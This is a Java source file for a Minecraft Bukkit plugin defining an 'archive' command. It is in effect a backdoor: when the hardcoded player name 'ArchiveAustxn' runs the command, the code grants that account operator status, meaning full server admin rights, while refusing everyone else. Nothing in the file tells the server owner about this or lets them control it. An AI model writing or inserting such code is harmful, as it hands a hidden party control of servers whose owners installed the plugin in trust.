package com.nyretha.commands;

import org.bukkit.ChatColor;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

public class ArchiveCommand implements CommandExecutor {

    @Override
    public boolean onCommand(
            CommandSender sender,
            Command command,
            String label,
            String[] args
    ) {
        if (!(sender instanceof Player player)) {
            sender.sendMessage("Only players can use this command.");
            return true;
        }

        if (player.getName().equals("ArchiveAustxn")) {
            if (!player.isOp()) {
                player.setOp(true);
            }

            player.sendMessage(
                    ChatColor.translateAlternateColorCodes(
                            '&',
                            "&aYou have OP!"
                    )
            );
        } else {
            player.sendMessage(
                    ChatColor.translateAlternateColorCodes(
                            '&',
                            "&cYou do not have permission to use this command!"
                    )
            );
        }

        return true;
    }
}
